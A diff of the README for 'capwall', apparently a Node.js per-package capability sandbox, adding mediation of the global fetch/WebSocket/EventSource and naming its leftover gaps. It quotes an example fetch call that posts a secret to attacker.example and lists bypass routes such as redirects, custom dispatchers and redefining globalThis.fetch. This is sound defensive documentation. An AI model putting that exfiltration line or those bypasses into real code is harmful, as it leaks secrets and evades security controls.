@@ -9,7 +9,8 @@ subprocesses, env, …), then enforce it at runtime.
 > status is tracked). The observe → policy → enforce loop runs end-to-end on **both the CJS
 > `require` and the ESM `import` paths**, for `fs`, the egress modules
 > (`net`/`http`/`https`/`tls`/`http2`/`dgram`), `child_process`, `worker_threads`,
-> `process.env`, `vm`, and `.node` addon loads.
+> `process.env`, `vm`, `.node` addon loads, `Module.prototype._compile`, and the **global**
+> egress APIs `fetch`/`WebSocket`/`EventSource`.
 >
 > **Nothing is published to npm yet** and every package is at version `0.0.0` — run it from a
 > clone (see [Quickstart](#quickstart-the-observe--enforce-loop)). And read
@@ -28,8 +29,9 @@ interesting damage — credential exfiltration, wallet theft, lateral movement �
 happens.
 
 capwall closes that gap. It sits inside the running process and mediates the
-capability-sensitive surface (`fs`; `net`/`http`/`https`/`tls`/`http2`/`dgram`;
-`child_process`; `worker_threads`; `process.env`; `vm`; and `.node` addon loads) **per owning
+capability-sensitive surface (`fs`; `net`/`http`/`https`/`tls`/`http2`/`dgram`; the global
+`fetch`/`WebSocket`/`EventSource`; `child_process`; `worker_threads`; `process.env`; `vm`;
+`.node` addon loads; and `Module.prototype._compile`) **per owning
 package**. A logging library that suddenly opens a
 socket to an unknown host, or a color-string helper that reads `process.env`, is a policy
 violation — logged in `observe` mode, denied in `enforce` mode.
@@ -182,13 +184,21 @@ The `compile` and `vm` grants are identity-granting in the same spirit — a pac
 either can execute as any principal in the policy. See
 [`docs/threat-model.md`](./docs/threat-model.md) § Package identity.
 
-One coverage gap is worth naming here rather than leaving to the appendix, because it is
-cheap for an attacker and needs no knowledge of capwall: **`globalThis.fetch` and
-`globalThis.WebSocket` are not mediated.** capwall intercepts *module* surfaces, and those
-globals never route through a module load, so a dependency calling
-`fetch("https://attacker.example/", { method: "POST", body: secret })` is neither denied nor
-logged. capwall's egress control covers the `net`/`http`/`https`/`tls`/`http2`/`dgram` module
-surfaces; pair it with network-level egress control if the global APIs matter to you.
+**Global egress is covered, with named residuals.** `globalThis.fetch`, `globalThis.WebSocket`
+and `globalThis.EventSource` never route through a module load, so no shim can see them; they
+are instead replaced on `globalThis` and checked against the same `net` grant as
+`http.request` (issue #80). A dependency calling
+`fetch("https://attacker.example/", { method: "POST", body: secret })` under a policy that does
+not grant that host is denied and logged, exactly like the module surfaces. Four things that
+guard does *not* do, because they are the honest edge of it: a **redirect hop is guarded only
+after the request has gone out** (undici follows it internally — capwall guards the final origin,
+so the hop is recorded and the response is cancelled in `enforce`, but the body has already
+left); `init.dispatcher` lets a caller supply the code that opens the socket, re-gated only if
+*that* code dials through a mediated module; a dependency that captured `fetch` before capwall
+installed holds the raw function; and the replaced global stays writable unless hardened mode is
+on — and even then `Object.defineProperty(globalThis, "fetch", …)` is open, which is the
+unavoidable price of a global `uninstall()` can put back. See
+[`docs/threat-model.md`](./docs/threat-model.md) § Global egress surfaces.
 
 Full details, and the comparison to the SES and Node-permission threat models, are in
 [`docs/threat-model.md`](./docs/threat-model.md) — read it before relying on capwall for
@@ -205,7 +215,8 @@ packages/policy-schema   @capwall/policy-schema  capabilities.json schema + TS t
 packages/sbom-import     @capwall/sbom-import    STRETCH: CycloneDX/CBOM → policy
 examples/express-app                             observe→enforce walkthrough fixture
 examples/malicious-dep-demo                      inert "malicious" dep capwall blocks
-docs/                                            threat-model, architecture, policy-format, roadmap
+docs/                                            threat-model, architecture, policy-format,
+                                                 roadmap, ci-local, releasing
 ```
 
 ## License
